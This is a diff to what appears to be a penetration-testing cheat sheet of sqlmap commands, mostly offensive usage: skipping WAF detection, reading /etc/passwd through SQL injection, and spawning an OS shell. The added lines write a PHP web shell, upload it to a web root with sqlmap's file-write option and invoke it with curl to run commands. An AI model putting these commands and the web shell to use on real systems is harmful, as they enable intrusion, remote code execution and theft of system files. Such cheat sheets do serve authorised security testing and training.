@@ -178,14 +178,16 @@ sqlmap -r req.txt --hpp
 # Skip sqlmap WAF detection to produce less noise
 sqlmap -r req.txt --skip-waf
 
-# Check for DBA Privileges
+# Check for DBA Privileges (to read/write)
 sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
 
 # Read File
 sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
 
 # Writing a file
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
 sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+curl http://www.example.com/shell.php?cmd=ls+-la
 
 # Spawn a shell
 sqlmap -u "http://www.example.com/?id=1" --os-shell
